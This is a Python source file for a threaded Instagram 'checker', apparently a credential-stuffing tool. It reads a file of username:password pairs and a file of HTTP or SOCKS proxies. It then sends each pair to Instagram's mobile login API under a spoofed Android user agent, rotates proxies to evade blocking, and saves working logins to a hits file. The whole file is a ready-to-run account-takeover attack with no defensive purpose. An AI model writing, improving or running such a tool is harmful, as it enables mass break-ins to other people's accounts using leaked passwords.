import os, threading, random, datetime, ctypes, time, uuid
try:
	import requests
except:
	os.system("pip install requests")
	import requests
try:
	import colorama
	colorama.init(autoreset=True)
except:
	os.system("pip install colorama")
	import colorama
	colorama.init(autoreset=True)
try:
	import tkinter
	from tkinter import filedialog, messagebox
except:
	os.system("pip install tk")
	import tkinter
	from tkinter import filedialog, messagebox
try:
	import socks
except:
	os.system("pip install pysocks")
	import socks
loke = threading.Lock()
root = tkinter.Tk()
root.withdraw()
current_date = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
if not os.path.exists("Results"):
	os.makedirs("Results/")
if not os.path.exists('Results/Insta'):
	os.makedirs('Results/Insta')
if not os.path.exists(f'Results/Insta/{current_date}'):
	os.makedirs(f'Results/Insta/{current_date}/')
combo = []
proxy = []
checked, good, free, banned, bad, errors, cpm1 = 0,0,0,0,0,0,0
logo = ""
logoo = f"""{colorama.Fore.LIGHTBLUE_EX}
_________________________$$$$$$$________________
________________________$$$$$$$$$$______________
________________________$$$$$$$$$$$_____________
_________________________$$$$$$$$$$$$$$_________
__________________________$$$$$$$$$$$___________
_____________________________$$$$$$$$$$$$$______
___________________________$$$$$$$$$$___________
_________________________$$$$$$$$$$$$$$$________
________________$$$______$$$$$$$$$$$$$$_________
______________$$$$$$$$_____$$$$$$__$$$$$________
_____________$$$$$$$$$$_____$$$$____$$$$$_______
___________$$$$$$_$$$$$$$$__$$$$______$$$$______
__________$$$$$_____$$$$$$$$_$$$$_______$$$_____
________$$$$$_________$$$$$$$$$$$$_______$$$____
_______$$$_____________$$$$$$$$$$$________$$$___
_____$$$________________$$$$$$$$$$________$$$$$$
__$$$$$$__________________$$$$$$$_______________

{colorama.Fore.LIGHTMAGENTA_EX}Made With <3 By 7sm
"""
for i in logoo.splitlines():
	logo += i.center(120)+"\n"
ctypes.windll.kernel32.SetConsoleTitleW("")


def load_combos():
	global combo
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Combo Settings")
	print("\n" + logo + "\n")
	print()
	input(" Press [ENTER] To Select Combo File..")
	fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
	filetype=(("txt", "*.txt"), ("All files", "*.txt")))
	if fileNameCombo is None:
		print()
		print(" Please Select Combo File..")
		time.sleep(2)
		startt()
	else:
		try:
			with open(fileNameCombo.name, 'r+', encoding='utf-8') as e:
				ext = e.readlines()
				for line in ext:
					try:
						combo.append(line.replace('\n', ''))
					except:
						pass
				print(" Loaded [{}] combos lines..".format(len(combo)))
				time.sleep(2)
		except Exception:
			print(" Bad Combo File, please try again..")
			time.sleep(2)
			startt()

def load_proxies():
	global proxy
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Proxies Settings |  ")
	print("\n" + logo + "\n")
	print()
	input(" Press [ENTER] To Select Proxy File..")
	fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
	if fileNameProxy is None:
		print()
		print(" Please Select Proxy File..")
		time.sleep(2)
		startt()
	else:
		try:
			with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
				ext = e.readlines()
				for line in ext:
					try:
						
						proxy.append(line.split()[0].replace('\n', ''))
					except:
						pass
				print(" Loaded [{}] proxies lines..".format(len(proxy)))
				time.sleep(2)
		except Exception:
			print(" Bad Proxy File, please try again..")
			time.sleep(2)
			startt()
	
def main():
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Login |  ")
	print("\n" + logo + "\n")
	print()
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Main Menu | ")
	print("\n" + logo + "\n")
	print()
	print(" Choose Mode")
	print("\n [1] Checker\n [2] Credits\n [69] Quit")
	try:
		question = int(input(" >> "))
		if question == 1:
			startt()
		elif question == 2:
			os.system('cls')
			ctypes.windll.kernel32.SetConsoleTitleW("Insta | Credit |  ")
			print("\n" + logo + "\n")
			print()
			print(" Coded by  ")
			print()
			input(" Press [ENTER] to Return To Main Menu..")
			main()
		elif question == 99:
			print(" Byee Byee..")
			time.sleep(2)
			os._exit(0)
		else:
			print(" Wrong Number..")
			time.sleep(2)
			main()
	except Exception:
		print(" Invalid Input..")
		time.sleep(2)
		main()

def screen_mc():
	global checked, good, free, banned, bad, errors, cpm1
	ctypes.windll.kernel32.SetConsoleTitleW(f"Insta | Done:[{checked}/{len(combo)}] - Hits:[{good}] - Bad:[{bad}] - Free:[{free}] - Banned:[{banned}]- Error:[{errors}] - CPM:[{cpm1*60}] |  ")
	cpm1 = 0
	time.sleep(1)
	threading.Thread(target=screen_mc, args=()).start()

def check(comboo, proxyy, proxy_type):
	global checked, good, free, banned, bad, errors, cpm1, proxy
	try:
		sess = requests.Session()
		if proxy_type == 1:
			try: 
				x = proxyy.split(":")
				if len(x) == 2:
					proxies = {'http': f'http://{proxyy}', 'https': f'http://{proxyy}'}
					sess.proxies = proxies
				elif len(x) == 4:
					proxies = {'http': f'http://{x[2]}:{x[3]}@{x[0]}:{x[1]}', 'https': f'http://{x[2]}:{x[3]}@{x[0]}:{x[1]}'}
					sess.proxies = proxies
				else:
					pass
			except Exception:
				pass
		elif proxy_type == 2:
			try: 
				x = proxyy.split(":")
				if len(x) == 2:
					proxies = {'http': f'socks4://{proxyy}','https':f'socks4://{proxyy}'}
					sess.proxies = proxies
				elif len(x) == 4:
					proxies = {'http': f'socks4://{x[2]}:{x[3]}@{x[0]}:{x[1]}','https': f'socks4://{x[2]}:{x[3]}@{x[0]}:{x[1]}'}
					sess.proxies = proxies
				else:
					pass
			except Exception:
				pass
		elif proxy_type == 3:
			try: 
				x = proxyy.split(":")
				if len(x) == 2:
					proxies = {'http': f'socks5://{proxyy}','https': f'socks5://{proxyy}'}
					sess.proxies = proxies
				elif len(x) == 4:
					proxies = {'http': f'socks5://{x[2]}:{x[3]}@{x[0]}:{x[1]}','https': f'socks5://{x[2]}:{x[3]}@{x[0]}:{x[1]}'}
					sess.proxies = proxies
				else:
					pass
			except Exception:
				pass
		else:
			pass
		username = comboo.split(":")[0]
		password = comboo.split(":")[1]
		uid = str(uuid.uuid4())
		login = sess.post("https://i.instagram.com/api/v1/accounts/login/",data={"uuid":uid,"password":password,"username":username,'device_id':uid,'from_reg':'false','_csrftoken':'missing','login_attempt_count':'0'},headers={'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',"Accept":"*/*","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US","X-IG-Capabilities":"3brTvw==","X-IG-Connection-Type":"WIFI","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",'Host':'i.instagram.com'}, timeout=5)
		if 'checkpoint_challenge_required' in login.text:
			with loke:
				free += 1
				checked += 1
				cpm1 += 1
				print(f"{colorama.Fore.LIGHTYELLOW_EX}[2FA] {comboo}")
				savefree = open(f'Results/Insta/{current_date}/2FA.txt','a+')
				savefree.write(f"{comboo}\n")
				savefree.close()
		elif 'two_factor_required":true,' in login.text:
			with loke:
				free += 1
				checked += 1
				cpm1 += 1
				print(f"{colorama.Fore.LIGHTYELLOW_EX}[2FA] {comboo}")
				savefree = open(f'Results/Insta/{current_date}/2FA.txt','a+')
				savefree.write(f"{comboo}\n")
				savefree.close()
		elif '"inactive user"' in login.text:
			with loke:
				banned += 1
				checked += 1
				cpm1 += 1
				print(f"{colorama.Fore.LIGHTMAGENTA_EX}[BANNED] {comboo}")
				savefree = open(f'Results/Insta/{current_date}/Banned.txt','a+')
				savefree.write(f"{comboo}\n")
				savefree.close()
		elif '"error_title":"Incorrect Username"' in login.text:
			with loke:
				bad += 1
				checked += 1
				cpm1 += 1
				print(f"{colorama.Fore.RED}[BAD] {comboo}")
		elif '"logged_in_user"' in login.text:
			with loke:
				username = login.json()["logged_in_user"]["username"]
				
				good += 1
				checked += 1
				cpm1 += 1
				print("f{colorama.Fore.GREEN}[HIT] {comboo} | Username:[{username}]") 
				SaveHits = open(f'Results/Insta/{current_date}/Hits.txt','a+')
				SaveHits.write(f"{comboo} | Username: {username}\n")
				SaveHits.close()
	
		elif '"error_title":"Incorrect password"' in login.text:
			with loke:
				bad += 1
				checked += 1
				cpm1 += 1
				print(f"{colorama.Fore.RED}[BAD] {comboo}")
			
		else:
			errors += 1
			threading.Thread(target=check, args=(comboo,random.choice(proxy),proxy_type)).start()
			
	except requests.exceptions.HTTPError:
		errors += 1
		threading.Thread(target=check, args=(comboo,random.choice(proxy),proxy_type)).start()  
	except requests.exceptions.ConnectionError:
		errors += 1
		threading.Thread(target=check, args=(comboo,random.choice(proxy),proxy_type)).start()
	except requests.exceptions.Timeout:
		errors += 1
		threading.Thread(target=check, args=(comboo,random.choice(proxy),proxy_type)).start()
		
	except requests.exceptions.RequestException:
		errors += 1
		threading.Thread(target=check, args=(comboo,random.choice(proxy),proxy_type)).start()

def startt():
	global combo, proxy
	combo.clear()
	proxy.clear()
	load_combos()
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Proxies Settings |  ")
	print("\n" + logo + "\n")
	print()
	print(" Enter Proxy Type")
	print("\n [1] HTTP/s\n [2] SOCKS4\n [3] SOCKS5")
	try:
		proxy_type = int(input(" >> "))
	except Exception:
		print(" Invalid Input..")
		time.sleep(2)
		main()
	load_proxies()
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Threads Settings |  ")
	print("\n" + logo + "\n")
	print()
	print(" Enter Threads Number [Max 1000]")
	try:
		threads = int(input(" >> "))
		if threads > 1000:
			print(" Maximum Thread is {}1000{}".format(colorama.Fore.RED, colorama.Fore.RESET))
			time.sleep(2)
			startt()
	except Exception:
		print("  Invalid input..")
		time.sleep(2)
		startt()
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Starting Now |  ")
	print("\n" + logo + "\n")
	print()
	print(" Running Checker..")
	os.system('cls')
	ctypes.windll.kernel32.SetConsoleTitleW("Insta | Starting Now |  ")
	print("\n" + logo + "\n")
	print()
	time.sleep(1.5)
	screen_mc()
	num = 0
	while 1:
		if threading.active_count() < int(threads):
			if len(combo) > checked:
				try:
					threading.Thread(target=check, args=(combo[num],random.choice(proxy),proxy_type)).start()
					num+=1
				except:
					os.system('cls')
					ctypes.windll.kernel32.SetConsoleTitleW("Insta | Closing Now |  ")
					print("\n" + logo + "\n")
					print(f" Done Checking All {len(combo)}..")
					print()
					time.sleep(5)
					print()
					input(" Press [ENTER] to Exit..")
					os._exit(0)

main()
